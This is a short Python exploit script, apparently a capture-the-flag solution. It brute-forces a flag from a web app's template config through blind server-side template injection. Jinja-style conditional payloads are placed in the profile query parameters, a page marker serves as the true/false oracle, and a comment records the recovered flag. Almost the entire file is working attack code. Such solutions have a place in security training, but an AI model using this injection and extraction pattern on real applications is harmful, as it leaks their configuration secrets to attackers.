import requests
from Helpers import *
from Brute import *

TARGET_URL = 'http://gc1.eng.run:30366'

def check(pos,ch):
    data = f"name=a&bio={{%if+config['FLAG'][{pos}]=='{ch}'%}}&position={{%endif%}}"
    res = requests.get(f"{TARGET_URL}/profile?{data}")
    if "card-jobtitle" in res.text:
        return True
    else:
        return False

def checkLen(l):
    data = f"name=a&bio={{%if+config['FLAG']|length=={l}%}}&position={{%endif%}}"
    res = requests.get(f"{TARGET_URL}/profile?{data}")
    if "card-jobtitle" in res.text:
        return True
    else:
        return False

def Main():
    options=Helpers.getOptions()
    options['checkChar']=check
    options['len']=31
    options['flag']='inctf{bl1nd_sst1_1s_41s0_c0ol_'
    #inctf{bl1nd_sst1_1s_41s0_c0ol_54d927a2}
    brute = Brute(**options)
    flag=brute.run(5)

Main()

